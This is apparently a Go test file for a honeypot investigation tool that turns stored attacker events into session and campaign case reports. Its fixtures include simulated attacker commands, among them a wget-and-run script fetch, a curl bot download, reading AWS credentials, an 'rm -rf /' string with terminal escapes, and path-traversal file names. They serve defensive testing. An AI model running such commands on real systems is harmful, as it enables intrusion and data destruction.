package investigate

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/qpot/qpot/internal/canary"
	"github.com/qpot/qpot/internal/database"
	"github.com/qpot/qpot/internal/intelligence"
)

// memDB is a database of events and sessions held in memory. Its GetEvents
// answers as the backends do: both bounds inclusive, newest first, a page by
// limit and offset.
type memDB struct {
	events   []*database.Event
	sessions []*database.TTPSession
	queries  int
	fail     error
}

func (m *memDB) GetEvents(_ context.Context, f database.EventFilter) ([]*database.Event, error) {
	m.queries++
	if m.fail != nil {
		return nil, m.fail
	}
	var out []*database.Event
	for _, e := range m.events {
		if !f.StartTime.IsZero() && e.Timestamp.Before(f.StartTime) {
			continue
		}
		if !f.EndTime.IsZero() && e.Timestamp.After(f.EndTime) {
			continue
		}
		if len(f.SourceIPs) > 0 && !contains(f.SourceIPs, e.SourceIP) {
			continue
		}
		out = append(out, e)
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Timestamp.After(out[j].Timestamp) })
	if f.Offset >= len(out) {
		return nil, nil
	}
	out = out[f.Offset:]
	if f.Limit > 0 && len(out) > f.Limit {
		out = out[:f.Limit]
	}
	return out, nil
}

func (m *memDB) GetTTPSessions(_ context.Context, limit int) ([]*database.TTPSession, error) {
	if m.fail != nil {
		return nil, m.fail
	}
	out := append([]*database.TTPSession{}, m.sessions...)
	sort.SliceStable(out, func(i, j int) bool { return out[i].LastSeen.After(out[j].LastSeen) })
	if limit > 0 && len(out) > limit {
		out = out[:limit]
	}
	return out, nil
}

// base is a recent whole second, so no test session has expired.
var base = time.Now().UTC().Add(-20 * time.Minute).Truncate(time.Second)

func at(ms int) time.Time { return base.Add(time.Duration(ms) * time.Millisecond) }

// ev makes a classified stored event.
func ev(ms int, hp, ip, typ string) *database.Event {
	return &database.Event{Timestamp: at(ms), Honeypot: hp, SourceIP: ip, SourcePort: 40000, DestPort: 22, Protocol: "ssh",
		EventType: typ, Classified: true, Metadata: map[string]string{"session": "c-" + ip}}
}

func cmd(ms int, ip, text string) *database.Event {
	e := ev(ms, "cowrie", ip, "cowrie.command.input")
	e.Command = text
	return e
}

func login(ms int, ip, user, pass string, ok bool) *database.Event {
	e := ev(ms, "cowrie", ip, "cowrie.login.failed")
	if ok {
		e.EventType = "cowrie.login.success"
	}
	e.Username, e.Password = user, pass
	return e
}

func download(ms int, ip, url, sha, outfile string) *database.Event {
	e := ev(ms, "cowrie", ip, "cowrie.session.file_download")
	e.Payload = []byte(url)
	e.Metadata["shasum"], e.Metadata["outfile"] = sha, outfile
	return e
}

// newDB stores the events and the sessions the campaign builder makes of
// them, as the worker would have.
func newDB(t testing.TB, events ...*database.Event) *memDB {
	t.Helper()
	sorted := append([]*database.Event{}, events...)
	sort.SliceStable(sorted, func(i, j int) bool { return sorted[i].Timestamp.Before(sorted[j].Timestamp) })
	b := intelligence.NewTTPBuilder(30 * time.Minute)
	for _, e := range sorted {
		b.Update(e)
	}
	return &memDB{events: events, sessions: b.GetActiveSessions()}
}

func sessionOf(t testing.TB, db *memDB, ip string) *database.TTPSession {
	t.Helper()
	for _, s := range db.sessions {
		if contains(s.SourceIPs, ip) {
			return s
		}
	}
	t.Fatalf("no session of %s", ip)
	return nil
}

// checkCited fails when the case cites a record it does not carry, or
// carries a record under a reference that is not its own.
func checkCited(t testing.TB, c *Case) {
	t.Helper()
	have := map[string]bool{}
	for _, r := range c.Records {
		if RecordRef(r.Event) != r.Ref {
			t.Fatalf("record %s is stored under another reference", r.Ref)
		}
		have[r.Ref] = true
	}
	cite := func(where string, refs ...string) {
		for _, ref := range refs {
			if ref != "" && !strings.HasPrefix(ref, "trip:") && !have[ref] {
				t.Fatalf("%s cites %s, which the case does not carry", where, ref)
			}
		}
	}
	for _, sc := range c.Sessions {
		for _, st := range sc.Timeline {
			if len(st.Refs) == 0 {
				t.Fatalf("step %q rests on no record", st.Summary)
			}
			cite("a step", st.Refs...)
			cite("a step's cause", st.CausedBy)
		}
		for _, f := range sc.Files {
			cite("a file", f.Refs...)
			cite("a file", f.Commands...)
		}
		for _, e := range sc.Evidence {
			cite("evidence", e.Refs...)
		}
	}
	for _, l := range c.Links {
		for _, side := range l.Sessions {
			if len(side.Refs) == 0 {
				t.Fatalf("link %s rests on no record in session %s", l.Value, side.SessionID)
			}
			cite("a link", side.Refs...)
		}
	}
	for _, g := range c.Gaps {
		cite("a gap", g.Refs...)
	}
}

func gapOf(c *Case, kind string) *Gap {
	for i := range c.Gaps {
		if c.Gaps[i].Kind == kind {
			return &c.Gaps[i]
		}
	}
	return nil
}

func record(c *Case, ref string) *database.Event {
	for _, r := range c.Records {
		if r.Ref == ref {
			return r.Event
		}
	}
	return nil
}

const payloadSHA = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"

// One visitor: connects, guesses passwords, gets in, looks around, fetches a
// payload and leaves. The case follows that course, and each step leads to
// the records it stands for.
func TestSessionCaseFollowsTheIntrusion(t *testing.T) {
	const ip = "203.0.113.7"
	events := []*database.Event{ev(0, "cowrie", ip, "cowrie.session.connect")}
	for i := 0; i < 6; i++ {
		events = append(events, login(100+i*10, ip, "root", fmt.Sprintf("pw%d", i), false))
	}
	events = append(events, login(200, ip, "root", "admin", true),
		cmd(300, ip, "uname -a"), cmd(310, ip, "cat /proc/cpuinfo"),
		cmd(320, ip, "cd /tmp; wget http://dl.example.net/x.sh; sh x.sh"),
		download(400, ip, "http://dl.example.net/x.sh", payloadSHA, "dl/x.sh"),
		cmd(500, ip, "rm -rf x.sh"))
	closed := ev(900, "cowrie", ip, "cowrie.session.closed")
	closed.Metadata["duration"] = "0.9"
	events = append(events, closed)
	db := newDB(t, events...)
	s := sessionOf(t, db, ip)

	c, err := SessionCaseFor(context.Background(), db, s.SessionID, Options{})
	if err != nil {
		t.Fatal(err)
	}
	checkCited(t, c)
	if len(c.Records) != len(events) || c.Summary.EventsRead != len(events) {
		t.Fatalf("%d records, %d read, of %d events", len(c.Records), c.Summary.EventsRead, len(events))
	}
	if got := strings.Join(c.Summary.Reached, ","); got != "connection,credentials,command,transfer" {
		t.Fatalf("reached %s", got)
	}
	var phases []string
	for _, st := range c.Sessions[0].Timeline {
		phases = append(phases, st.Phase)
	}
	if got := strings.Join(phases, ","); got != "connection,credentials,credentials,command,command,command,transfer,command,close" {
		t.Fatalf("timeline %s", got)
	}
	tl := c.Sessions[0].Timeline
	// The six refused guesses are one step that still names all six records.
	if g := tl[1]; g.Count != 6 || g.Outcome != "refused" || len(g.Refs) != 6 || len(g.Tried) != 6 || g.Until == nil || !strings.HasPrefix(g.Summary, "6 logins refused") {
		t.Fatalf("folded guesses: %+v", g)
	}
	if ok := tl[2]; ok.Outcome != "accepted" || ok.Username != "root" || ok.Password != "admin" || ok.Count != 1 {
		t.Fatalf("accepted login: %+v", ok)
	}
	// The download follows from the command that names its URL.
	tr := tl[6]
	if tr.SHA256 != payloadSHA || tr.URL != "http://dl.example.net/x.sh" || tr.File != "dl/x.sh" {
		t.Fatalf("transfer: %+v", tr)
	}
	cause := record(c, tr.CausedBy)
	if cause == nil || !strings.Contains(cause.Command, "wget http://dl.example.net/x.sh") || tr.Because != "the command names this URL" {
		t.Fatalf("transfer cause %q (%s): %+v", tr.CausedBy, tr.Because, cause)
	}
	files := c.Sessions[0].Files
	if len(files) != 1 || files[0].SHA256 != payloadSHA || files[0].Transfers != 1 || len(files[0].Commands) != 1 || files[0].Commands[0] != tr.CausedBy {
		t.Fatalf("files: %+v", files)
	}
	// Cowrie keeps no output per command, and the case says so.
	if g := gapOf(c, GapOutputNotKept); g == nil || g.Count != 4 {
		t.Fatalf("output gap: %+v", g)
	}
	if g := gapOf(c, GapEventLimit); g != nil {
		t.Fatalf("unexpected limit gap: %+v", g)
	}
	if g := gapOf(c, GapSameInstant); g != nil {
		t.Fatalf("every event has a time of its own, yet: %+v", g)
	}
	// Evidence: the download host, the payload. Four commands are no sequence.
	var kinds []string
	for _, e := range c.Sessions[0].Evidence {
		kinds = append(kinds, e.Kind+"="+e.Value)
	}
	sort.Strings(kinds)
	if got := strings.Join(kinds, " "); got != "host=dl.example.net payload="+payloadSHA {
		t.Fatalf("evidence %s", got)
	}

	var text bytes.Buffer
	if err := WriteText(&text, c); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"Session " + s.SessionID, "connection → credentials → command → transfer", "6 logins refused", "follows the command in [" + tr.CausedBy + "]", payloadSHA} {
		if !strings.Contains(text.String(), want) {
			t.Fatalf("text lacks %q:\n%s", want, text.String())
		}
	}
}

// Three sources: two fetched the same payload from the same host, and the
// second ran the same five commands as the third. The campaign case names
// each shared piece of evidence and the records that show it, per session.
func TestCampaignCaseShowsWhySessionsAreLinked(t *testing.T) {
	script := []string{"uname -a", "id", "nproc", "cat /etc/issue", "crontab -l"}
	var events []*database.Event
	for i, ip := range []string{"198.51.100.1", "198.51.100.2", "198.51.100.3"} {
		off := i * 10000
		events = append(events, ev(off, "cowrie", ip, "cowrie.session.connect"), login(off+10, ip, "root", "root", true))
		if i > 0 {
			for j, c := range script {
				events = append(events, cmd(off+20+j, ip, c))
			}
		}
		if i < 2 {
			events = append(events, cmd(off+100, ip, "curl -O http://203.0.113.50/bot"), download(off+110, ip, "http://203.0.113.50/bot", payloadSHA, "dl/bot"))
		}
	}
	// A fourth source that only ran one of those commands is no part of it.
	events = append(events, ev(50000, "cowrie", "198.51.100.9", "cowrie.session.connect"), cmd(50010, "198.51.100.9", "uname -a"))
	db := newDB(t, events...)
	first := sessionOf(t, db, "198.51.100.1")
	for _, ip := range []string{"198.51.100.2", "198.51.100.3"} {
		if s := sessionOf(t, db, ip); s.CampaignFingerprint != first.CampaignFingerprint {
			t.Fatalf("%s is not in the campaign", ip)
		}
	}
	if s := sessionOf(t, db, "198.51.100.9"); s.CampaignFingerprint == first.CampaignFingerprint {
		t.Fatal("one common command linked a source")
	}

	c, err := CampaignCaseFor(context.Background(), db, first.CampaignFingerprint, Options{})
	if err != nil {
		t.Fatal(err)
	}
	checkCited(t, c)
	if c.Summary.Sessions != 3 || len(c.Sessions) != 3 || len(c.Summary.Sources) != 3 {
		t.Fatalf("summary: %+v", c.Summary)
	}
	got := map[string]int{}
	for _, l := range c.Links {
		got[l.Kind+"="+l.Value] = len(l.Sessions)
		for _, side := range l.Sessions {
			// Each side's records really show the value.
			for _, ref := range side.Refs {
				e := record(c, ref)
				shows := false
				for _, piece := range strings.Split(l.Value, "\n") {
					if strings.Contains(e.Command, piece) || strings.Contains(string(e.Payload), piece) || e.Metadata["shasum"] == piece {
						shows = true
					}
				}
				if !shows {
					t.Fatalf("record %s does not show %q", ref, l.Value)
				}
			}
		}
	}
	want := map[string]int{
		"payload=" + payloadSHA: 2,
		"host=203.0.113.50":     2,
		intelligence.EvidenceSequence + "=" + strings.Join(script, "\n"): 2,
	}
	if fmt.Sprint(got) != fmt.Sprint(want) {
		t.Fatalf("links\n got %v\nwant %v", got, want)
	}
	if g := gapOf(c, GapNoSharedEvidence); g != nil {
		t.Fatalf("every session shares evidence, yet: %+v", g)
	}

	// The same session opened alone lists the other two as its campaign.
	one, err := SessionCaseFor(context.Background(), db, first.SessionID, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(one.Related) != 2 || one.Related[0].Relation != "same campaign" {
		t.Fatalf("related: %+v", one.Related)
	}
}

// The collector stamps events when it reads them: a quick connection's events
// are stored with one time, in whatever order the database returns them. The
// timeline then follows the course of a connection, the same way every time,
// and the case says that the order inside the instant was not recorded.
func TestEventsOfOneInstantFollowTheCourseOfAConnection(t *testing.T) {
	const ip = "203.0.113.30"
	closed := ev(0, "cowrie", ip, "cowrie.session.closed")
	events := []*database.Event{
		closed, cmd(0, ip, "id"), ev(0, "cowrie", ip, "cowrie.log.closed"), login(0, ip, "root", "x", true), ev(0, "cowrie", ip, "cowrie.session.params"),
		ev(0, "cowrie", ip, "cowrie.client.version"), download(0, ip, "http://dl.example.net/a", payloadSHA, "dl/a"), ev(0, "cowrie", ip, "cowrie.session.connect"),
		cmd(500, ip, "later"),
	}
	want := "connection,other,credentials,other,command,transfer,other,close,command"
	for round := 0; round < 3; round++ {
		// Whatever order the store gives them in.
		events = append(events[1:], events[0])
		db := newDB(t, events...)
		c, err := SessionCaseFor(context.Background(), db, sessionOf(t, db, ip).SessionID, Options{})
		if err != nil {
			t.Fatal(err)
		}
		var phases []string
		for _, st := range c.Sessions[0].Timeline {
			phases = append(phases, st.Phase)
		}
		if got := strings.Join(phases, ","); got != want {
			t.Fatalf("round %d: timeline %s", round, got)
		}
		if g := gapOf(c, GapSameInstant); g == nil || g.Count != 8 {
			t.Fatalf("gap: %+v", g)
		}
	}
	// Where events carry the honeypot's own time, that decides.
	a, b := cmd(0, ip, "second"), cmd(0, ip, "first")
	a.Metadata["observed_at"], b.Metadata["observed_at"] = "2026-11-14T10:00:02Z", "2026-11-14T10:00:01Z"
	db := newDB(t, a, b)
	c, err := SessionCaseFor(context.Background(), db, sessionOf(t, db, ip).SessionID, Options{})
	if err != nil || c.Sessions[0].Timeline[0].Command != "first" || gapOf(c, GapSameInstant) != nil {
		t.Fatalf("observed_at does not order: %v, gaps %+v", err, c.Gaps)
	}
}

// A session is read forwards in windows, whatever the density: every event
// of the source once, none of another source, earliest first; and under a
// limit the timeline keeps the beginning and says there is more.
func TestSessionReadIsWholeAndInOrder(t *testing.T) {
	const ip, other = "2001:db8:1:2::10", "2001:db8:9:9::1"
	var events []*database.Event
	add := func(ms int, addr string, n int) {
		for i := 0; i < n; i++ {
			e := ev(ms, "dionaea", addr, "dionaea.connection.tcp.accept")
			e.SourcePort = 1000 + len(events)
			events = append(events, e)
		}
	}
	add(0, ip, 3)
	add(5, ip, 2500)               // one millisecond holding more than two batches
	add(5, other, 700)             // and another source in the same millisecond
	add(6, "2001:db8:1:2::99", 40) // the same /64 is the same source
	add(2000, ip, 1200)            // a dense second
	add(600000, ip, 5)             // then quiet for ten minutes
	add(600000, other, 5)
	db := newDB(t, events...)
	s := sessionOf(t, db, ip)
	want, _, ok := intelligence.SplitSessionID(s.SessionID)
	if !ok {
		t.Fatal("session ID")
	}
	const mine = 3 + 2500 + 40 + 1200 + 5
	got, more, err := readSession(context.Background(), db, s, want, HardMaxEvents)
	if err != nil || more || len(got) != mine {
		t.Fatalf("%d events, more %v, err %v; want %d", len(got), more, err, mine)
	}
	seen := map[int]bool{}
	for i, e := range got {
		if i > 0 && e.Timestamp.Before(got[i-1].Timestamp) {
			t.Fatal("not in time order")
		}
		if seen[e.SourcePort] || strings.HasPrefix(e.SourceIP, "2001:db8:9") {
			t.Fatalf("event %d read twice or from another source", e.SourcePort)
		}
		seen[e.SourcePort] = true
	}
	// Dense stretches are found by narrowing the window, not event by event.
	if db.queries > 120 {
		t.Fatalf("%d reads for one session", db.queries)
	}

	// Under a limit: the first events, and a gap that says so.
	got, more, err = readSession(context.Background(), db, s, want, 100)
	if err != nil || !more || len(got) != 100 || !got[0].Timestamp.Equal(at(0)) || got[99].Timestamp.After(at(5)) {
		t.Fatalf("limited read: %d events, more %v, err %v", len(got), more, err)
	}
	c, err := SessionCaseFor(context.Background(), db, s.SessionID, Options{MaxEvents: 100})
	if err != nil {
		t.Fatal(err)
	}
	if g := gapOf(c, GapEventLimit); g == nil || g.Count != 100 || c.Summary.Events != mine {
		t.Fatalf("limit gap %+v, summary %+v", g, c.Summary)
	}
	// 100 alike events are one step, not a hundred lines.
	if tl := c.Sessions[0].Timeline; len(tl) != 1 || tl[0].Count != 100 || len(tl[0].Refs) != MaxRefs || tl[0].MoreRefs != 100-MaxRefs {
		t.Fatalf("folded timeline: %d steps, %+v", len(tl), tl[0])
	}
}

// What was cut, discarded, removed or not yet classified is reported, with
// the records concerned.
func TestCaseReportsItsGaps(t *testing.T) {
	const ip = "192.0.2.44"
	long := cmd(10, ip, strings.Repeat("A", 300))
	long.Metadata["truncated"], long.Metadata["input_chars"], long.Metadata["input_sha256"] = "input", "60000", payloadSHA
	lost := ev(20, "cowrie", ip, "cowrie.log.line_discarded")
	lost.Payload = []byte(`{"eventid":"cowrie.command.input","src_ip":"192.0.2.44"`)
	fresh := cmd(30, ip, "whoami")
	fresh.Classified = false
	db := newDB(t, ev(0, "cowrie", ip, "cowrie.session.connect"), long, lost, fresh)
	s := sessionOf(t, db, ip)
	s.EventCount = 9 // five of its events are no longer stored

	c, err := SessionCaseFor(context.Background(), db, s.SessionID, Options{})
	if err != nil {
		t.Fatal(err)
	}
	checkCited(t, c)
	for kind, count := range map[string]int{GapValueCut: 1, GapLineDiscarded: 1, GapUnclassified: 1, GapEventsMissing: 5} {
		g := gapOf(c, kind)
		if g == nil || g.Count != count {
			t.Fatalf("gap %s: %+v", kind, g)
		}
	}
	if g := gapOf(c, GapValueCut); !strings.Contains(g.Detail, "60000 characters") || record(c, g.Refs[0]) != long {
		t.Fatalf("cut gap: %+v", g)
	}
	var text bytes.Buffer
	if err := WriteText(&text, c); err != nil || !strings.Contains(text.String(), "value-cut: ") {
		t.Fatalf("text: %v\n%s", err, text.String())
	}

	// A session stored by a version that did not key sessions by source.
	db.sessions = append(db.sessions, &database.TTPSession{SessionID: "a1b2c3d4", CampaignFingerprint: "a1b2c3d4", FirstSeen: at(0), LastSeen: at(50), EventCount: 3})
	old, err := SessionCaseFor(context.Background(), db, "a1b2c3d4", Options{})
	if err != nil || gapOf(old, GapOldSession) == nil || len(old.Records) != 0 {
		t.Fatalf("old session: %v %+v", err, old)
	}
	if _, err := SessionCaseFor(context.Background(), db, "nope", Options{}); !errors.Is(err, ErrNotFound) {
		t.Fatalf("unknown session: %v", err)
	}
	if _, err := CampaignCaseFor(context.Background(), db, "", Options{}); !errors.Is(err, ErrNotFound) {
		t.Fatalf("empty fingerprint: %v", err)
	}
}

// A HiFi cell's command is one step from its start and finish records, with
// the exit code and what it printed, read from the cell's capture folder and
// from nowhere else.
func TestHiFiCommandsCarryTheirOutput(t *testing.T) {
	const ip = "192.0.2.80"
	cells := t.TempDir()
	write := func(rel, text string) {
		t.Helper()
		p := filepath.Join(cells, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	id := func(n int) string { return fmt.Sprintf("%032x", n) }
	file := func(n int) string { return "20261114T100000Z-" + id(n) }
	hifi := func(ms int, phase string, n int, text string) *database.Event {
		e := ev(ms, "ssh-proxy", ip, "ssh-proxy.command."+phase)
		e.Command, e.Username = text, "deploy"
		e.Metadata = map[string]string{"cell": "ssh-backend-2", "role": "app", "uid": "1001", "capture_id": id(n), "state_scope": "private_cell",
			"stdout_file": file(n) + ".out", "stderr_file": file(n) + ".err"}
		if phase == "finish" {
			e.Metadata["exit_code"] = "3"
		}
		return e
	}
	write("slot-2/current/uid-1001/"+file(1)+".out", "Linux edge 6.1\n")
	write("slot-2/current/uid-1001/"+file(1)+".err", "warning\n")
	write("slot-2/archive-g4-ab12/logs/uid-1001/"+file(2)+".out", "from the archive\n")
	write("secret.txt", "not a capture")
	write("slot-2/current/uid-1001/"+file(4)+".out", strings.Repeat("x", MaxOutput+10))

	escape := hifi(700, "finish", 5, "cat x")
	escape.Metadata["stdout_file"] = "../../../secret.txt"
	gone := hifi(800, "finish", 6, "ls /gone")
	events := []*database.Event{
		hifi(100, "start", 1, "uname -a"), hifi(150, "finish", 1, "uname -a"),
		hifi(200, "start", 2, "cat notes"), hifi(250, "finish", 2, "cat notes"),
		hifi(300, "start", 3, "sleep 600"),
		hifi(400, "finish", 4, "yes"), escape, gone,
	}
	db := newDB(t, events...)
	s := sessionOf(t, db, ip)
	out := &HiFiOutput{Cells: cells, Slot: func(service string) (string, error) {
		if service != "ssh-backend-2" {
			return "", errors.New("unknown")
		}
		return "slot-2", nil
	}}
	c, err := SessionCaseFor(context.Background(), db, s.SessionID, Options{Output: out})
	if err != nil {
		t.Fatal(err)
	}
	checkCited(t, c)
	tl := c.Sessions[0].Timeline
	if len(tl) != 6 {
		t.Fatalf("%d steps", len(tl))
	}
	if st := tl[0]; st.Command != "uname -a" || len(st.Refs) != 2 || st.ExitCode == nil || *st.ExitCode != 3 || st.Output == nil ||
		st.Output.Stdout != "Linux edge 6.1\n" || st.Output.Stderr != "warning\n" || !st.At.Equal(at(100)) {
		t.Fatalf("command with output: %+v %+v", st, st.Output)
	}
	if st := tl[1]; st.Output == nil || st.Output.Stdout != "from the archive\n" {
		t.Fatalf("archived output: %+v", st.Output)
	}
	if st := tl[2]; st.Outcome != "no finish recorded" || st.Output != nil {
		t.Fatalf("unfinished: %+v", st)
	}
	if st := tl[3]; st.Output == nil || !st.Output.Cut || len(st.Output.Stdout) != MaxOutput {
		t.Fatalf("long output: cut %v", st.Output != nil && st.Output.Cut)
	}
	// A name that is no capture file is never opened, and counts as missing.
	if tl[4].Output != nil || tl[5].Output != nil {
		t.Fatalf("output read for %q or a file that is gone", escape.Metadata["stdout_file"])
	}
	if g := gapOf(c, GapOutputMissing); g == nil || g.Count != 2 {
		t.Fatalf("missing output gap: %+v", g)
	}
	if g := gapOf(c, GapUnfinished); g == nil || g.Count != 1 {
		t.Fatalf("unfinished gap: %+v", g)
	}
	if gapOf(c, GapOutputNotKept) != nil {
		t.Fatal("a HiFi cell does keep output")
	}
	for _, name := range []string{"x.out", "../" + file(1) + ".out", file(1) + ".out/..", "/etc/passwd", file(1) + ".err"} {
		e := hifi(0, "finish", 1, "x")
		e.Metadata["stdout_file"] = name
		if data, _, found, err := out.Output(e, "stdout"); found || err != nil || data != nil {
			t.Fatalf("stdout_file %q was read", name)
		}
	}
	for key, bad := range map[string]string{"cell": "ssh-backend-99", "uid": "../1001", "role": "database"} {
		e := hifi(0, "finish", 1, "x")
		e.Metadata[key] = bad
		if _, _, found, _ := out.Output(e, "stdout"); found {
			t.Fatalf("%s %q was read", key, bad)
		}
	}
}

// A canary tripped by the session's source during the session is a step of
// its timeline; one tripped by that source at another time is listed apart;
// another source's is neither. The canary's secret is not copied.
func TestCanaryTripsJoinTheTimeline(t *testing.T) {
	const ip = "192.0.2.61"
	db := newDB(t, ev(0, "cowrie", ip, "cowrie.session.connect"), cmd(100, ip, "cat ~/.aws/credentials"), cmd(60000, ip, "exit"))
	s := sessionOf(t, db, ip)
	trips := []*canary.Trip{
		{ID: "trip_in", CanaryID: "cnry_1", Token: "SECRETTOKEN", Kind: canary.Kind("aws"), Name: "ops keys", Channel: "honeypot", Time: at(30000), SourceIP: ip, Detail: "matched in cowrie session", Repeats: 2},
		{ID: "trip_later", CanaryID: "cnry_1", Token: "SECRETTOKEN", Kind: canary.Kind("aws"), Name: "ops keys", Channel: "http", Time: at(60000).Add(3 * time.Hour), SourceIP: ip},
		{ID: "trip_other", CanaryID: "cnry_2", Kind: canary.Kind("web"), Name: "wiki", Channel: "http", Time: at(30000), SourceIP: "192.0.2.200"},
	}
	c, err := SessionCaseFor(context.Background(), db, s.SessionID, Options{Trips: trips})
	if err != nil {
		t.Fatal(err)
	}
	checkCited(t, c)
	if len(c.Trips) != 2 || c.Trips[0].ID != "trip_in" || c.Trips[0].SessionID != s.SessionID || c.Trips[1].SessionID != "" || c.Summary.Trips != 2 {
		t.Fatalf("trips: %+v", c.Trips)
	}
	tl := c.Sessions[0].Timeline
	if len(tl) != 4 || tl[2].Phase != PhaseCanary || tl[2].Refs[0] != "trip:trip_in" || tl[2].Count != 3 || !strings.Contains(tl[2].Summary, `"ops keys"`) {
		t.Fatalf("timeline: %+v", tl)
	}
	if got := strings.Join(c.Summary.Reached, ","); got != "connection,command,canary" {
		t.Fatalf("reached %s", got)
	}
	data, err := json.Marshal(c)
	if err != nil || bytes.Contains(data, []byte("SECRETTOKEN")) {
		t.Fatalf("the canary's value is in the case (%v)", err)
	}
}

// An address that is Docker's own is no source: such a session is one
// honeypot connection, its case does not name the address as the visitor's,
// and a canary trip from that address is not pinned on it.
func TestSharedSourceSessionIsOneConnection(t *testing.T) {
	const docker = "172.18.0.1"
	mk := func(ms int, conn, text string) *database.Event {
		e := cmd(ms, docker, text)
		e.Metadata = map[string]string{"session": conn, database.SharedSourceKey: "docker"}
		return e
	}
	db := newDB(t, mk(0, "aaa", "id"), mk(10, "bbb", "uname"), mk(20, "aaa", "ls"))
	if len(db.sessions) != 2 {
		t.Fatalf("%d sessions", len(db.sessions))
	}
	var s *database.TTPSession
	for _, x := range db.sessions {
		if x.EventCount == 2 {
			s = x
		}
	}
	trips := []*canary.Trip{{ID: "trip_x", Kind: canary.Kind("web"), Name: "n", Channel: "http", Time: at(10), SourceIP: docker}}
	c, err := SessionCaseFor(context.Background(), db, s.SessionID, Options{Trips: trips})
	if err != nil {
		t.Fatal(err)
	}
	checkCited(t, c)
	if len(c.Records) != 2 || gapOf(c, GapSharedSource) == nil || len(c.Trips) != 0 || gapOf(c, GapCanaryUnmatched) == nil {
		t.Fatalf("records %d, gaps %+v, trips %+v", len(c.Records), c.Gaps, c.Trips)
	}
	for _, st := range c.Sessions[0].Timeline {
		if st.Command != "id" && st.Command != "ls" {
			t.Fatalf("another connection's command: %q", st.Command)
		}
	}
}

// A source that comes back is a new session; each lists the other.
func TestReturningSourceIsRelated(t *testing.T) {
	const ip = "192.0.2.90"
	early := intelligence.NewTTPBuilder(30 * time.Minute)
	e1 := cmd(-3*3600*1000, ip, "id")
	early.Update(e1)
	db := newDB(t, cmd(0, ip, "id"))
	db.events = append(db.events, e1)
	db.sessions = append(db.sessions, early.GetActiveSessions()...)
	if len(db.sessions) != 2 || db.sessions[0].SessionID == db.sessions[1].SessionID {
		t.Fatalf("%d sessions", len(db.sessions))
	}
	var later *database.TTPSession
	for _, s := range db.sessions {
		if s.FirstSeen.Equal(at(0)) {
			later = s
		}
	}
	c, err := SessionCaseFor(context.Background(), db, later.SessionID, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(c.Related) != 1 || c.Related[0].Relation != "same source, earlier" || len(c.Records) != 1 {
		t.Fatalf("related %+v, %d records", c.Related, len(c.Records))
	}
}

func TestListGroupsSessionsIntoCampaigns(t *testing.T) {
	var events []*database.Event
	for i, ip := range []string{"198.51.100.1", "198.51.100.2", "198.51.100.3"} {
		events = append(events, ev(i*1000, "cowrie", ip, "cowrie.session.connect"))
		if i < 2 {
			events = append(events, download(i*1000+10, ip, "http://203.0.113.50/bot", payloadSHA, "dl/bot"))
		}
	}
	db := newDB(t, events...)
	l, err := List(context.Background(), db, 2)
	if err != nil {
		t.Fatal(err)
	}
	if len(l.Sessions) != 2 || l.Scanned != 3 || l.More || len(l.Campaigns) != 1 || l.Campaigns[0].Sessions != 2 || l.Campaigns[0].Events != 4 {
		t.Fatalf("listing: %+v", l)
	}
	if l.Sessions[0].SessionID != sessionOf(t, db, "198.51.100.3").SessionID || l.Sessions[0].CampaignSessions != 1 || l.Sessions[1].CampaignSessions != 2 {
		t.Fatalf("sessions: %+v", l.Sessions)
	}
	var text bytes.Buffer
	if err := WriteListing(&text, l); err != nil || !strings.Contains(text.String(), "2 sessions") {
		t.Fatalf("%v\n%s", err, text.String())
	}
	db.fail = errors.New("down")
	if _, err := List(context.Background(), db, 0); err == nil {
		t.Fatal("a failed read is not an empty listing")
	}
}

// Attacker text reaches a terminal only as visible characters.
func TestTextNeverCarriesControlCharacters(t *testing.T) {
	const ip = "192.0.2.13"
	hostile := "echo \x1b[2J\x1b]0;owned\x07\r\nrm -rf / \u202egnp.exe\x00\x9b31m \xff"
	e := cmd(10, ip, hostile)
	bad := login(5, ip, "ro\x1bot", "p\nw", false)
	db := newDB(t, bad, e, download(20, ip, "http://e\x1b.example/x", payloadSHA, "dl/\x07x"))
	s := sessionOf(t, db, ip)
	c, err := SessionCaseFor(context.Background(), db, s.SessionID, Options{})
	if err != nil {
		t.Fatal(err)
	}
	var text bytes.Buffer
	if err := WriteText(&text, c); err != nil {
		t.Fatal(err)
	}
	assertPrintable(t, text.String())
	if !strings.Contains(text.String(), `\x1b[2J`) || !strings.Contains(text.String(), `\u{202e}`) {
		t.Fatalf("the escapes are not shown:\n%s", text.String())
	}
	// The record itself is untouched.
	if record(c, RecordRef(e)).Command != hostile {
		t.Fatal("the record was altered")
	}
}

func assertPrintable(t testing.TB, text string) {
	t.Helper()
	if !utf8.ValidString(text) {
		t.Fatal("the text holds bytes that are not UTF-8")
	}
	for i, r := range text {
		if r == '\n' {
			continue
		}
		if unsafeRune(r) {
			t.Fatalf("character %U at byte %d of the text", r, i)
		}
	}
}
